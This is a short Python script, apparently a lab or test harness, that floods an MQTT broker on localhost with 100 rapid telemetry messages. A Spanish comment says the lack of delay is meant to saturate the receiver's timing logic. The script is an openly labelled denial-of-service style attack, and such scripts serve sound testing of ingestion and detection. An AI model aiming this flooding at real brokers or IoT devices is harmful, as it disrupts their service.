import paho.mqtt.client as mqtt
import json
import time

BROKER = "localhost"
TOPIC = "device_1/telemetry"

client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883)

print("Starting Aggressive Flooding Attack...")

for i in range(100):
    flood_data = {"temperature": 25.0, "humidity": 50.0, "seq": i}
    client.publish(TOPIC, json.dumps(flood_data))
    # Sin delay para saturar la lógica de tiempo del receptor
    
print("Flood complete.")
client.disconnect()